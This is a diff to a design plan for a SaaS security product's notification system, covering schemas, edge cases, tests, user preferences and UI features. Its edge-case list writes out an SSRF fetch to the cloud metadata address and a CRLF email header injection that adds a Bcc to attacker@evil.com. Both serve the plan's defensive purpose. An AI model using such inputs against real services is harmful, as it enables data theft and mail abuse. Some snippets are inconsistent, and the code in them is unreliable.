+  previous_code TEXT,
+  new_code TEXT,
+  previous_destinations JSONB,
+  new_destinations JSONB,
+  changed_by_user_id UUID REFERENCES auth.users(id) ON DELETE SET NULL,
+  changed_by_name TEXT,
+  message TEXT,
+  created_at TIMESTAMPTZ DEFAULT now()
+);
+
+CREATE INDEX idx_rule_changes_rule ON notification_rule_changes(rule_id, created_at DESC);
 ```
 
 ### 9O: New and Modified Files Summary
 
 **New files:**
 
-- `ee/backend/lib/event-bus.ts` -- event emission, QStash dispatch queuing, batch emission, SSRF-protected fetch proxy (9B, 9B.1)
+- `ee/backend/lib/event-bus.ts` -- event emission, QStash dispatch queuing, batch emission (9B)
 - `ee/backend/lib/notification-dispatcher.ts` -- core dispatch engine, rule resolution, sandbox execution, OAuth refresh mutex (9C, 9C.5)
 - `ee/backend/lib/notification-validator.ts` -- trigger code validation (syntax, shape, fetch resilience) (9D)
-- `ee/backend/lib/destination-dispatchers.ts` -- all 8 destination dispatchers + message templates (9F)
+- `ee/backend/lib/destination-dispatchers.ts` -- all 9 destination dispatchers + message templates + message length enforcement (9F, 9G.5)
 - `ee/backend/lib/notification-rate-limiter.ts` -- Redis sliding window rate limiting (9I)
+- `ee/backend/lib/notification-health.ts` -- connection health monitoring, auto-disable after consecutive failures (9V)
 - `backend/database/notification_events_schema.sql` -- events table with dispatch_attempts column, UNIQUE dedup index (9N)
 - `backend/database/notification_deliveries_schema.sql` -- deliveries table with denormalized organization_id (9N)
+- `backend/database/phase9_prerequisites.sql` -- token_expires_at, timezone, schedule_config, consecutive_failures columns (9N.0)
+- `backend/database/phase9_user_notifications.sql` -- user_notification_preferences + user_notifications tables (9N, 9R, 9S)
+- `backend/database/phase9_rule_changes.sql` -- notification_rule_changes table (9U)
 - `backend/database/phase9_migrations.sql` -- CHECK constraint updates, RLS policies (9N)
+- `backend/src/routes/notification-unsubscribe.ts` -- CE route for email unsubscribe (token-based, no auth) (9F.8)
+- `frontend/src/components/NotificationBell.tsx` -- in-app notification bell + dropdown (9S)
+- `frontend/src/app/pages/NotificationHistorySection.tsx` -- delivery history table with filters (9J.2)
 
 **Modified files:**
 
-- `ee/backend/routes/workers.ts` -- add QStash consumer endpoints: `dispatch-notification`, `dispatch-notification-batch`, `weekly-digest`, `reconcile-stuck-notifications` (9C, 9K, 9B.2); add `emitEvent()` calls after extraction (9M.1)
-- `ee/backend/routes/organizations.ts` -- add validation to notification rule CRUD endpoints (9D.4); add `/validate-notification-rule` endpoint (9D); add `/test-notification-rule` endpoint (9L); add `/notification-history` + retry endpoints (9J.2)
-- `ee/backend/routes/projects.ts` -- add validation to project notification rule CRUD endpoints (9D.4); add project-scoped notification history endpoint
-- `ee/backend/routes/integrations.ts` -- add `emitEvent()` calls in `handlePullRequestEvent` (9M.3)
+- `ee/backend/routes/workers.ts` -- add QStash consumer endpoints: `dispatch-notification`, `dispatch-notification-batch`, `digest-check`, `reconcile-stuck-notifications` (9C, 9K, 9B.2); add `emitEvent()` calls after extraction (9M.1)
+- `ee/backend/routes/organizations.ts` -- add validation to notification rule CRUD endpoints (9D.4); add `/validate-notification-rule` endpoint (9D); add `/test-notification-rule` endpoint (9L); add `/notification-history` + retry endpoints (9J.2); add PagerDuty connect endpoint (9F.10a); add rule change history recording (9U); add emitEvent calls for member/integration events (9M)
+- `ee/backend/routes/projects.ts` -- add validation to project notification rule CRUD endpoints (9D.4); add project-scoped notification history endpoint; add emitEvent calls for project_created/deleted (9M)
+- `ee/backend/routes/integrations.ts` -- add `emitEvent()` calls in `handlePullRequestEvent` (9M.3); add emitEvent for integration_connected/disconnected; populate token_expires_at on OAuth callbacks
 - `ee/backend/lib/qstash.ts` -- add `queueNotificationDispatch()` function (9B)
 - `backend/watchtower-poller/src/dependency-refresh.ts` -- add `emitEvent()` calls for new versions, deprecations, anomalies (9M.5)
-- `frontend/src/app/pages/NotificationRulesSection.tsx` -- add validation error display (9D.5), add "Test Rule" button and results UI (9L.3), add "Send Test" button (9L.4)
-- `frontend/src/app/pages/OrganizationSettingsPage.tsx` -- add "History" sub-tab in Notifications section (9J.2)
+- `backend/src/index.ts` -- mount notification-unsubscribe CE route, mount user-notifications CE route
+- `frontend/src/app/pages/NotificationRulesSection.tsx` -- add validation error display (9D.5), live syntax validation (9D.6), IntelliSense (9D.7), auto-save drafts (9D.8), "Test Rule" button and results UI (9L.3), "Send Test" button (9L.4), enable/disable toggle, rule change history viewer (9U), dry-run mode toggle (9X), PagerDuty in ConnectionDropdown
+- `frontend/src/app/pages/OrganizationSettingsPage.tsx` -- add "History" sub-tab in Notifications section (9J.2), add PagerDuty card in Integrations section (9F.10a)
+- `frontend/src/app/pages/SettingsPage.tsx` -- add "Notifications" tab for user-level preferences (9R)
+- `frontend/src/components/AppHeader.tsx` -- add NotificationBell component (9S)
+- `frontend/src/components/NotificationAIAssistant.tsx` -- update with all 33+ event types, new context fields (pr, batch, previous), enhanced return value format
+- `frontend/src/app/pages/DocsPage.tsx` -- update NotificationRulesContent with new event types, context shape, PagerDuty, validation, test/preview, delivery tracking, digest configuration (9Z)
 - `backend/load-ee-routes.js` -- mount new QStash consumer routes
 
 ### 9P: Edge Cases and Error Handling
 
 1. **Sandbox timeout during dispatch**: If a rule's trigger code hangs (e.g., slow external fetch), the 10s timeout kills it. The rule is marked as `'skipped'` for this event with error "Trigger code timed out (10s)". Other rules continue processing.
-2. **Sandbox crash (OOM)**: If trigger code exceeds 128MB memory, isolated-vm throws. Catch the error, mark rule as `'skipped'`, log the OOM. Continue with other rules.
+2. **Sandbox crash**: If trigger code throws an unhandled error (infinite loop caught by timeout, unexpected input), catch the error, mark rule as `'skipped'` with the error message, and continue with other rules. Note: the `Function()` sandbox does not enforce memory limits -- extremely memory-hungry code could impact the Node.js process. Mitigate with the 10s timeout (prevents infinite allocation loops) and consider `isolated-vm` in Phase 14.
 3. **Destination API down**: If Slack/Jira/etc. returns 5xx, the delivery is marked `'failed'` with `retryable: true`. QStash retries up to 5 times with exponential backoff. If still failing after all retries, the delivery stays `'failed'` and appears in the notification history with a "Retry" button.
 4. **OAuth token expired (Jira, Asana, GitLab, Bitbucket OAuth)**: Before each API call, check token expiry. If expired, use the refresh_token to get a new access_token. If refresh fails (token revoked), mark delivery as `'failed'` with error "OAuth token expired. Please reconnect the integration in Organization Settings." Log the error and set the integration status to `'error'`.
 5. **Destination removed between rule creation and dispatch**: A rule references a destination ID that no longer exists (integration was disconnected). The delivery is marked `'skipped'` with error "Destination not found. The integration may have been disconnected." No crash.
@@ -2184,6 +2671,18 @@ CREATE POLICY "Service role full access to notification deliveries"
 20. **OAuth refresh contention**: When 5+ deliveries fire in parallel for the same OAuth integration (Jira, Asana) and the token is expired, the Redis mutex (9C.5) serializes the refresh. The first dispatch acquires the lock and refreshes. The other 4 wait up to 5 seconds, then re-read the token from the DB. If the lock times out (30s TTL), it auto-releases so the system isn't deadlocked.
 21. **SSRF attempt via trigger code fetch()**: If notification trigger code calls `fetch('http://169.254.169.254/...')` or any private IP, the SSRF protection layer (9B.1) blocks the request before it leaves the server. The fetch returns an error ("Blocked: private IP range"), which the trigger code's try/catch handles. The blocked URL is logged to the audit trail with the org_id and rule_id for investigation.
 22. **Email header injection attempt**: If trigger code returns `{ notify: true, title: "fake\r\nBcc: attacker@evil.com" }`, the email dispatcher strips `\r`, `\n`, and null bytes from the title before using it as the email subject (9F.8). The injection is neutralized, and the sanitized title is used as-is.
+23. **Plan downgrade (Phase 13)**: If billing reduces an org's notification quota, existing active rules are **paused** (set `active = false`), not deleted. The org admin sees a banner: "N notification rules were paused because your plan allows M rules." Re-upgrading restores them.
+24. **Integration token revoked externally**: User revokes Slack/Jira access outside Deptex (e.g., in Slack admin). Next delivery attempt gets 401. After **3 consecutive auth failures** to the same integration, auto-set `organization_integrations.status = 'error'` and emit `integration_disconnected` event. The integration card in Settings shows a red "Reconnect Required" badge.
+25. **Webhook URL returns redirect (3xx)**: Custom webhook returns 301/302. The dispatcher uses `redirect: 'error'` to reject redirects (security: open redirect could route to internal IP). Delivery marked `'failed'` with error "Webhook returned redirect (3xx). Redirects are not followed for security."
+26. **Very long custom message from trigger code**: Code returns `{ message: '...' }` with 100KB+ text. The `enforceMessageLimits()` function (9G.5) truncates per-destination before dispatch. The original full message is stored in `notification_deliveries.message_payload` for audit.
+27. **Unicode/emoji in message titles**: Jira and Linear have character encoding quirks. Normalize titles to NFC form (`title.normalize('NFC')`) and strip zero-width characters before dispatching to ticketing destinations.
+28. **Rule references a deleted team_integration**: FK ON DELETE CASCADE on `team_integrations` removes the row, but the rule's `destinations` JSONB still references the old integration ID. The dispatcher lookup returns null. Delivery marked `'skipped'` with error "Destination not found (integration may have been removed)."
+29. **Batch with 10,000+ events**: Extreme extraction of a monorepo. Cap batch event insertion at 500 rows per batch. If more, create multiple batch_ids and queue separate dispatch jobs. The dispatcher cap ensures no single QStash message exceeds Upstash's 1MB payload limit.
+30. **QStash message size limit**: QStash has a 1MB max payload. Event dispatch messages only send `{ eventId }` (tiny), not the full payload. Batch messages send `{ batchId, eventCount }`. The dispatcher fetches full event data from the DB. No payload size issue.
+31. **Clock skew between API server and QStash**: QStash delay is relative ("30s from now"), not absolute. Skew doesn't affect delay timing. For deduplication windows, use DB server timestamps (`now()`) not application timestamps.
+32. **Notification about a deleted project**: Between event emission and dispatch, the project is deleted. `project_id` FK is `ON DELETE SET NULL`. The dispatcher checks for null `project_id` and uses the event's cached `payload.project_name` for the message. No crash.
+33. **Rate limit meta-notification loop**: When a rate limit warning is sent to org admins (9I.3), this is itself a notification. Use `source: 'notification_system'` on meta-notifications. The dispatcher skips rules for events with this source to prevent infinite loops.
+34. **Concurrent rule updates during dispatch**: An admin updates a rule while it's being evaluated for an in-flight event. The dispatcher loads rules at the start of dispatch and uses that snapshot. The updated rule applies to the next event only.
 
 ### 9Q: Test Plan
 
@@ -2302,4 +2801,563 @@ Tests 64-65 (RLS):
 
 1. Supabase client query on `notification_events` returns only the authenticated user's org's events
 2. Non-admin org member cannot read `notification_deliveries` (RLS blocks, only admin/owner allowed)
+
+Tests 66-70 (Security Hardening):
+
+1. Custom webhook with redirect (3xx) is rejected (redirect: 'error'), delivery marked 'failed'
+2. Email unsubscribe token: valid JWT unsubscribes user; expired/invalid JWT returns 401
+3. Message exceeding destination limit is truncated (Slack 3000 chars -> truncated with "..." suffix)
+4. Webhook secret rotation: both current and previous secrets accepted during 72-hour grace period
+5. PII redacted mode for Jira: ticket body contains only title + "View in Deptex" link, no vuln details
+
+Tests 71-75 (User Preferences and In-App):
+
+1. Email dispatcher skips delivery when user has `email_opted_out = true` in preferences
+2. User notification preferences DND: notification created but deferred to after DND window
+3. In-app notification created for org members when event fires
+4. Mark-as-read endpoint updates `read_at` timestamp
+5. Unread count badge reflects correct count from `user_notifications` WHERE `read_at IS NULL`
+
+Tests 76-80 (New Edge Cases):
+
+1. Plan downgrade pauses rules exceeding new plan limit (rules set `active = false`)
+2. 3 consecutive auth failures auto-disable integration (`status = 'error'`, `consecutive_failures >= 3`)
+3. Batch with 500+ events splits into multiple batch_ids (cap at 500 per batch)
+4. Deleted project: event dispatch uses cached project name from payload, no crash
+5. Concurrent rule update during dispatch: dispatcher uses snapshot of rules loaded at dispatch start
+
+Tests 81-83 (Rule Versioning and Dry-Run):
+
+1. Rule code update creates `notification_rule_changes` entry with previous + new code
+2. Dry-run rule evaluates against live events but delivery status = 'dry_run', no actual dispatch
+3. Configurable digest schedule: daily digest dispatches every 24h, weekly on configured day
+
+Tests 84-85 (Connection Health):
+
+1. After 3 consecutive delivery failures to same integration, `organization_integrations.status` set to 'error'
+2. Integration status reset to 'active' after next successful delivery
+
+### 9R: User Notification Preferences
+
+Individual users can control how they receive notifications, independent of the org/team/project rules configured by admins.
+
+**9R.1: Preferences table**
+
+See `user_notification_preferences` in 9N. One row per (user, organization) pair.
+
+**9R.2: Settings UI**
+
+Add a "Notifications" tab to the existing `/settings` page (SettingsPage.tsx):
+
+- **Email notifications**: Toggle on/off per org (sets `email_opted_out`)
+- **Event type filters**: Multi-select checklist of event types to mute (e.g., uncheck `new_version_available` to stop those notifications)
+- **Project muting**: Select specific projects to mute notifications from
+- **Do Not Disturb**: Set quiet hours (start/end hour in user's timezone). During DND, in-app notifications are still created but email/Slack DM delivery is deferred until DND ends
+- **Delivery preference**: Radio: "Instant" | "Daily digest" | "Weekly digest" | "Off" per org
+
+**9R.3: Dispatcher integration**
+
+Before dispatching to any user-targeted destination (email, Slack DM, in-app), the dispatcher checks `user_notification_preferences`:
+
+```
+checkUserPreferences(userId, orgId, eventType, projectId):
+  1. Load preferences for (userId, orgId)
+  2. If email_opted_out and destination is email: skip
+  3. If event type is in muted_event_types: skip
+  4. If project_id is in muted_project_ids: skip
+  5. If current UTC hour is within DND range: defer (re-queue with delay until DND ends)
+  6. If digest_preference is 'daily_digest' or 'weekly_digest': queue for digest instead of instant
+```
+
+For channel-wide destinations (Slack channel, Discord channel), user preferences do NOT apply -- those are org-level. User preferences only affect user-scoped delivery (email to their address, Slack DM, in-app inbox).
+
+**9R.4: Unsubscribe endpoint**
+
+```typescript
+// CE route: backend/src/routes/notification-unsubscribe.ts
+router.post('/api/notifications/unsubscribe', async (req, res) => {
+  const { token } = req.query;
+  try {
+    const payload = jwt.verify(token as string, process.env.INTERNAL_API_KEY!);
+    const { email, orgId } = payload as { email: string; orgId: string };
+
+    // Find user by email
+    const { data: user } = await supabase.auth.admin.listUsers();
+    const targetUser = user.users.find(u => u.email === email);
+    if (!targetUser) return res.status(404).json({ error: 'User not found' });
+
+    // Upsert preference
+    await supabase.from('user_notification_preferences').upsert({
+      user_id: targetUser.id,
+      organization_id: orgId,
+      email_opted_out: true,
+    }, { onConflict: 'user_id,organization_id' });
+
+    // Show a simple HTML confirmation page
+    res.send('<html><body><h1>Unsubscribed</h1><p>You will no longer receive email notifications from this organization.</p><p><a href="/settings/notifications">Manage all preferences</a></p></body></html>');
+  } catch {
+    res.status(401).json({ error: 'Invalid or expired unsubscribe token' });
+  }
+});
+```
+
+**9R.5: API endpoints**
+
+- `GET /api/user-notification-preferences/:orgId` -- get preferences for current user + org
+- `PUT /api/user-notification-preferences/:orgId` -- update preferences
+- Both are CE routes (in `backend/src/routes/`) since they're user-scoped, not org-admin-scoped
+
+### 9S: In-App Notification Center
+
+Every enterprise SaaS (GitHub, Linear, Vercel) has an in-app notification bell. Deptex adds one.
+
+**9S.1: Notification bell component**
+
+`NotificationBell` in `AppHeader`:
+- Bell icon with unread count badge (red dot or number)
+- Click opens a dropdown panel (300px wide, max 400px tall with scroll)
+- Each notification: severity icon + title + timestamp + "View" link
+- Click a notification: marks as read, navigates to `deptex_url`
+- "Mark all as read" button at top
+- "View all notifications" link at bottom -> `/settings/notifications` or a dedicated `/notifications` page
+- Empty state: "No new notifications"
+
+**9S.2: Real-time updates**
+
+Subscribe to `user_notifications` table via Supabase Realtime:
+
+```typescript
+const channel = supabase
+  .channel('user-notifications')
+  .on('postgres_changes', {
+    event: 'INSERT',
+    schema: 'public',
+    table: 'user_notifications',
+    filter: `user_id=eq.${userId}`,
+  }, (payload) => {
+    // Add to local state, increment unread count, show browser toast
+  })
+  .subscribe();
+```
+
+When a new notification arrives: increment badge count, optionally show a browser toast notification (if user has granted `Notification` API permission).
+
+**9S.3: In-app notification creation**
+
+The dispatcher creates `user_notifications` rows for all org members (or team members for team-scoped events, or project contributors for project-scoped events) as a built-in destination that always fires alongside external destinations:
+
+```
+After event is dispatched to external destinations:
+  1. Determine target users:
+     - Org events: all org members
+     - Team events: all team members
+     - Project events: project team members
+  2. Filter by user_notification_preferences (muted events, muted projects)
+  3. Batch-insert into user_notifications
+```
+
+**9S.4: API endpoints**
+
+- `GET /api/user-notifications` -- paginated list (query params: `org_id`, `unread_only`, `page`, `per_page`)
+- `PATCH /api/user-notifications/:id/read` -- mark single notification as read
+- `POST /api/user-notifications/mark-all-read` -- mark all as read (for an org)
+- `GET /api/user-notifications/unread-count` -- returns `{ count: N }` (for badge)
+- All are CE routes (user-scoped)
+
+**9S.5: Retention**
+
+User notifications are retained for 30 days. The same cleanup job that handles `notification_events` (9J.3) also purges old `user_notifications`.
+
+### 9T: Mute and Snooze
+
+Temporary suppression of notifications without deleting or disabling rules.
+
+**9T.1: Rule snooze**
+
+Add a `snoozed_until` column to all notification rule tables:
+
+```sql
+ALTER TABLE organization_notification_rules ADD COLUMN snoozed_until TIMESTAMPTZ;
+ALTER TABLE team_notification_rules ADD COLUMN snoozed_until TIMESTAMPTZ;
+ALTER TABLE project_notification_rules ADD COLUMN snoozed_until TIMESTAMPTZ;
+```
+
+When dispatching, skip rules where `snoozed_until > now()`. The dispatcher treats snoozed rules like inactive rules for the duration.
+
+**Frontend:** In the notification rules table, each rule has a "Snooze" menu option with presets: 1 hour, 4 hours, 24 hours, 1 week, custom datetime. The rule row shows a snooze icon + "Snoozed until [time]" badge.
+
+**9T.2: Project mute**
+
+Users can mute all notifications from a specific project via their user preferences (`muted_project_ids` array in `user_notification_preferences`). This is per-user, not org-wide.
+
+**Frontend:** On the project header or project settings, add a "Mute notifications" button. This updates the user's preferences.
+
+**9T.3: Org-level pause**
+
+Org admins can pause ALL notification dispatching for the org. Add `notifications_paused_until` column to `organizations`:
+
+```sql
+ALTER TABLE organizations ADD COLUMN notifications_paused_until TIMESTAMPTZ;
+```
+
+When set, the dispatcher checks this before processing any event for the org. If `now() < notifications_paused_until`, the event is deferred (re-queued with delay). This is useful for maintenance windows or planned deployments.
+
+**Frontend:** In Organization Settings > Notifications, add a "Pause all notifications" button with duration presets (1h, 4h, 24h, custom). Shows a banner when active: "Notifications paused until [time]".
+
+### 9U: Rule Versioning and Change History
+
+Track changes to notification rules for audit and rollback.
+
+**9U.1: Change tracking**
+
+Every time a notification rule is created, updated, or deleted, record the change in `notification_rule_changes` (see 9N):
+
+```typescript
+// In the PUT /notification-rules/:ruleId handler:
+async function recordRuleChange(
+  ruleId: string, scope: 'organization' | 'team' | 'project', orgId: string,
+  previousCode: string | null, newCode: string | null,
+  previousDestinations: any, newDestinations: any,
+  userId: string, userName: string,
+): Promise<void> {
+  await supabase.from('notification_rule_changes').insert({
+    rule_id: ruleId,
+    rule_scope: scope,
+    organization_id: orgId,
+    previous_code: previousCode,
+    new_code: newCode,
+    previous_destinations: previousDestinations,
+    new_destinations: newDestinations,
+    changed_by_user_id: userId,
+    changed_by_name: userName,
+  });
+}
+```
+
+**9U.2: Change history UI**
+
+In the rule edit sidebar, add a "History" tab (alongside the code editor) that shows:
+- List of changes: timestamp, user name, diff summary ("code changed", "destinations added: Slack #alerts")
+- Click a change to see the diff (reuse `PolicyDiffViewer` component)
+- "Revert" button to restore previous code/destinations
+
+**9U.3: API endpoints**
+
+- `GET /api/organizations/:id/notification-rules/:ruleId/history` -- list changes for a rule
+- `POST /api/organizations/:id/notification-rules/:ruleId/revert/:changeId` -- revert to a previous version
+
+### 9V: Connection Health Monitoring
+
+Track integration health and auto-disable failing connections.
+
+**9V.1: Failure tracking**
+
+After each delivery attempt, update the integration's failure counter:
+
+```typescript
+async function updateConnectionHealth(connectionId: string, success: boolean): Promise<void> {
+  if (success) {
+    // Reset consecutive failures on success
+    await supabase.from('organization_integrations')
+      .update({ consecutive_failures: 0, status: 'active' })
+      .eq('id', connectionId)
+      .neq('consecutive_failures', 0); // only update if was non-zero
+  } else {
+    // Increment failures
+    const { data } = await supabase.from('organization_integrations')
+      .select('consecutive_failures')
+      .eq('id', connectionId)
+      .single();
+
+    const newCount = (data?.consecutive_failures || 0) + 1;
+    const updates: Record<string, any> = {
+      consecutive_failures: newCount,
+      last_failure_at: new Date().toISOString(),
+    };
+
+    // Auto-disable after 3 consecutive failures
+    if (newCount >= 3) {
+      updates.status = 'error';
+      // Emit event so admins are notified
+      await emitEvent({
+        type: 'integration_disconnected',
+        organizationId: connectionId, // resolve from connection
+        payload: { provider: connection.provider, reason: 'Auto-disabled after 3 consecutive failures' },
+        source: 'notification_system',
+        priority: 'high',
+      });
+    }
+
+    await supabase.from('organization_integrations')
+      .update(updates)
+      .eq('id', connectionId);
+  }
+}
+```
+
+**9V.2: Frontend health indicators**
+
+In Organization Settings > Integrations:
+- Connections with `status = 'error'` show a red "Reconnect Required" badge
+- Hover tooltip shows last error and failure count
+- "Retry" button to reset failures and attempt a test delivery
+
+In the notification history, failed deliveries with auth errors show: "This integration may need to be reconnected. [Go to Settings]".
+
+### 9W: Rule Templates and Presets
+
+Lower the barrier for non-technical users by providing pre-built notification rule templates.
+
+**9W.1: Template catalog**
+
+```typescript
+const RULE_TEMPLATES = [
+  {
+    id: 'critical-vuln-alert',
+    name: 'Critical Vulnerability Alert',
+    description: 'Notify immediately when a critical or high-severity vulnerability is discovered',
+    code: `if (context.event.type !== 'vulnerability_discovered') return false;
+if (!context.vulnerability) return false;
+return context.vulnerability.severity === 'critical' || context.vulnerability.severity === 'high';`,
+    suggestedDestinations: ['slack', 'email', 'pagerduty'],
+  },
+  {
+    id: 'malicious-package',
+    name: 'Malicious Package Detection',
+    description: 'Immediate alert when a dependency is flagged as malicious',
+    code: `return context.event.type === 'malicious_package_detected';`,
+    suggestedDestinations: ['slack', 'pagerduty', 'email'],
+  },
+  {
+    id: 'weekly-digest',
+    name: 'Weekly Security Digest',
+    description: 'Weekly summary of all security events across projects',
+    triggerType: 'weekly_digest',
+    suggestedDestinations: ['email', 'slack'],
+  },
+  {
+    id: 'policy-violation',
+    name: 'Policy Violation Alert',
+    description: 'Alert when a dependency violates package policy',
+    code: `return context.event.type === 'policy_violation' || context.event.type === 'license_violation';`,
+    suggestedDestinations: ['slack', 'jira'],
+  },
+  {
+    id: 'extraction-failure',
+    name: 'Extraction Failure Alert',
+    description: 'Alert when dependency extraction fails',
+    code: `return context.event.type === 'extraction_failed';`,
+    suggestedDestinations: ['slack', 'email'],
+  },
+  {
+    id: 'pr-check-failure',
+    name: 'PR Check Failure',
+    description: 'Alert when a PR fails dependency policy checks',
+    code: `if (context.event.type !== 'pr_check_completed') return false;
+return context.pr && context.pr.check_result === 'failed';`,
+    suggestedDestinations: ['slack', 'discord'],
+  },
+  {
+    id: 'crown-jewels-any-change',
+    name: 'Crown Jewels - Any Change',
+    description: 'Alert on any event affecting Crown Jewels projects',
+    code: `return context.project.asset_tier === 'Crown Jewels';`,
+    suggestedDestinations: ['slack', 'pagerduty'],
+  },
+  {
+    id: 'new-dep-low-score',
+    name: 'New Dependency with Low Score',
+    description: 'Alert when a new dependency is added with a low reputation score',
+    code: `if (context.event.type !== 'dependency_added') return false;
+return context.dependency && context.dependency.score < 50;`,
+    suggestedDestinations: ['slack', 'jira'],
+  },
+];
+```
+
+**9W.2: Template UI**
+
+When creating a new rule, the sidebar first shows a template picker:
+- Grid of template cards with name + description
+- "Start from template" button pre-fills the code editor and suggests destinations
+- "Start from scratch" option to skip templates
+- "Use AI Assistant" option (existing flow)
+
+### 9X: Dry-Run Mode
+
+Allow users to evaluate rules against live events without sending actual notifications.
+
+**9X.1: Dry-run column**
+
+```sql
+ALTER TABLE organization_notification_rules ADD COLUMN dry_run BOOLEAN DEFAULT false;
+ALTER TABLE team_notification_rules ADD COLUMN dry_run BOOLEAN DEFAULT false;
+ALTER TABLE project_notification_rules ADD COLUMN dry_run BOOLEAN DEFAULT false;
+```
+
+**9X.2: Dispatcher behavior**
+
+When a rule has `dry_run = true`:
+1. The trigger code IS evaluated against real events (same sandbox, same context)
+2. If the code returns truthy, a `notification_deliveries` row IS created
+3. But the delivery status is set to `'dry_run'` and no actual dispatch occurs
+4. The delivery row records what WOULD have been sent (message title, body, destination)
+
+This lets users see exactly what their rule would produce in the notification history.
+
+**9X.3: Frontend**
+
+In the rule edit sidebar:
+- Toggle: "Dry-run mode" (default off)
+- When on, show info text: "This rule will evaluate against real events but won't send actual notifications. Results appear in the History tab."
+- In the rules table: dry-run rules show a "Dry-run" badge instead of the active/inactive toggle
+- In notification history: dry-run deliveries show a distinct "Dry Run" status badge (gray/purple)
+
+### 9Y: Operational Observability
+
+Production monitoring and structured logging for the notification pipeline.
+
+**9Y.1: Structured logging**
+
+All notification pipeline logs use structured JSON format with consistent fields:
+
+```typescript
+function notificationLog(level: 'info' | 'warn' | 'error', message: string, context: {
+  eventId?: string;
+  ruleId?: string;
+  destinationId?: string;
+  deliveryId?: string;
+  orgId?: string;
+  provider?: string;
+  durationMs?: number;
+  error?: string;
+}) {
+  console[level](JSON.stringify({
+    component: 'notification-pipeline',
+    timestamp: new Date().toISOString(),
+    level,
+    message,
+    ...context,
+  }));
+}
+```
+
+**9Y.2: Key metrics to log**
+
+- `event_emitted`: event type, org, project, priority
+- `dispatch_started`: event ID, rule count, duration
+- `rule_evaluated`: rule ID, result (notify/skip/error), execution time
+- `delivery_attempted`: delivery ID, destination type, success/fail, response time
+- `delivery_retried`: delivery ID, attempt number, error
+- `rate_limited`: org ID, destination ID, limit type
+- `batch_dispatched`: batch ID, event count, summary
+
+**9Y.3: Notification health dashboard**
+
+Add a "Health" card in Organization Settings > Notifications (alongside Rules and History):
+
+- **Delivery success rate** (last 24h, 7d): percentage pie chart
+- **Event volume** (last 7d): sparkline chart by day
+- **Top triggered rules**: list of rules with highest fire count
+- **Recent failures**: last 5 failed deliveries with error preview
+- **Rate limit usage**: current usage vs. limit (e.g., "42/200 org notifications this hour")
+
+API: `GET /api/organizations/:id/notification-stats` -- returns aggregate counts for the dashboard.
+
+**9Y.4: Data retention cleanup**
+
+Standalone QStash CRON (not piggybacked on watchtower-poller):
+
+```typescript
+await qstash.schedules.create({
+  destination: `${API_BASE_URL}/api/workers/notification-cleanup`,
+  cron: '0 3 * * *', // daily at 3 AM UTC
+});
+```
+
+Cleanup handler:
+1. Delete `notification_events` older than 90 days (or org's configured retention)
+2. Delete `notification_deliveries` older than 90 days
+3. Delete `user_notifications` older than 30 days
+4. Delete `notification_rule_changes` older than 1 year
+5. Log cleanup counts for monitoring
+
+**Note on dedup index**: After cleanup removes old events, a new event with the same `deduplication_key` will succeed (the UNIQUE index no longer has the old row). This is expected behavior -- dedup is meant to prevent duplicate events within a short window, not permanently.
+
+### 9Z: Documentation Updates
+
+All documentation changes needed for Phase 9.
+
+**9Z.1: Update `NotificationRulesContent` in DocsPage.tsx**
+
+- **Event types table**: Update from 10 to 33+ events, organized by category (vuln, dep, policy, PR, security, membership, system)
+- **Context object reference**: Add `pr`, `batch`, `previous` fields. Document all fields on `dependency` (malicious_indicator, slsa_level, etc.)
+- **Return values**: Document the enhanced return format `{ notify, message, title, priority }`
+- **Destinations**: Add PagerDuty (9th destination). Update descriptions for all destinations.
+- **Validation**: New section explaining save-time validation (syntax, shape, fetch resilience)
+- **Testing**: New section explaining "Test Rule" and "Send Test" features
+- **Delivery tracking**: New section explaining the History tab, retry mechanism, and retention policy
+- **Digest**: New section explaining weekly/daily digest configuration
+- **Rate limits**: New section explaining per-org and per-destination limits
+- **User preferences**: New section explaining per-user notification settings and unsubscribe
+- **Templates**: New section listing available rule templates
+- **Custom webhook format**: Update with full payload schema, HMAC verification code example, IP allowlisting info
+
+**9Z.2: Update Learn tutorials**
+
+- Update "Setting Up Notification Rules" tutorial with new features
+- Add "Debugging Notification Delivery Issues" tutorial (check History tab, verify destinations, common errors)
+- Add "Writing Advanced Trigger Code" tutorial (fetch(), batch context, custom messages)
+
+**9Z.3: Update Help Center**
+
+Add FAQ entries:
+- "Why didn't my notification send?" (rate limited, rule skipped, destination error, check History)
+- "How do I test notification rules?" (Test Rule button, dry-run mode)
+- "How do I unsubscribe from email notifications?" (unsubscribe link, Settings > Notifications)
+- "What IP addresses do Deptex webhooks come from?" (QStash IP ranges)
+- "How do I set up PagerDuty?" (routing key setup guide)
+
+**9Z.4: Update NotificationAIAssistant context**
+
+The AI assistant's system prompt and `NotificationContext` types need updating with:
+- All 33+ event types (not just the original 10)
+- New context fields (pr, batch, previous)
+- Enhanced return value format
+- New sample prompts leveraging the expanded event catalog
+
+### 9AA: Implementation Order
+
+Recommended implementation sequence with dependencies:
+
+1. **Database migrations** (9N) -- all tables, indexes, RLS, prerequisite columns. No code dependencies.
+2. **Event bus** (9B) -- `emitEvent()`, `emitEventBatch()`. Depends on: 9N tables.
+3. **Trigger code validation** (9D) -- reuse policy-engine.ts sandbox. Depends on: nothing (validates code without dispatch).
+4. **Dispatcher engine** (9C) -- rule resolution, sandbox execution, dedup. Depends on: 9B (reads events), 9D (shared sandbox).
+5. **Destination dispatchers** (9F) -- implement one at a time:
+   - a. Email (simplest, uses existing `sendEmail`) + unsubscribe endpoint
+   - b. Slack (Block Kit)
+   - c. Custom webhook (HMAC signing)
+   - d. Discord (embeds)
+   - e. Jira (OAuth refresh, ADF format)
+   - f. Linear (GraphQL)
+   - g. Asana (OAuth refresh)
+   - h. PagerDuty (connect flow + Events API)
+6. **Event source hooks** (9M) -- wire `emitEvent()` into extraction, vuln monitor, policy eval, watchtower, PR handler, membership, integrations. Depends on: 9B.
+7. **Rate limiting** (9I) -- Redis sliding window. Depends on: 9C (rate check during dispatch).
+8. **Batching** (9H) -- batch dispatch, summary templates. Depends on: 9B, 9C, 9F.
+9. **Delivery tracking + History UI** (9J) -- table writes in dispatcher, API, frontend. Depends on: 9C, 9F.
+10. **Connection health monitoring** (9V) -- failure tracking after each delivery. Depends on: 9F.
+11. **Weekly digest** (9K) -- QStash cron, digest assembly. Depends on: 9B (reads events), 9F (sends to destinations).
+12. **Test/preview** (9L) -- test endpoint, preview UI. Depends on: 9D (validation), 9F (message templates).
+13. **Stuck event reconciliation** (9B.2) -- QStash cron. Depends on: 9B.
+14. **User notification preferences** (9R) -- settings UI, dispatcher integration. Depends on: 9C.
